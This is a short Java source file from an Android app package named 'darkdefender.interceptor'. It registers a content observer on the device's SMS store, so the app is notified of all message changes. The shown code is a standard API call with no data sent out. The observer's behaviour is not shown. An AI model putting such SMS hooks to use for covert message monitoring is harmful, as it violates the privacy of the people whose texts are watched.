package org.darkdefender.interceptor.regedit;

import org.darkdefender.interceptor.observers.SmsObserver;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;

public class Regedit {

	private Context ctx;
	
	public Regedit(Context ctx){
		this.ctx = ctx;
	}
	
	public void registerSmsObserver(){
		ContentObserver observer = new SmsObserver(new Handler(), ctx);
        ctx.getContentResolver().registerContentObserver(
                        Uri.parse("content://sms"), true, observer);
	}
	
}
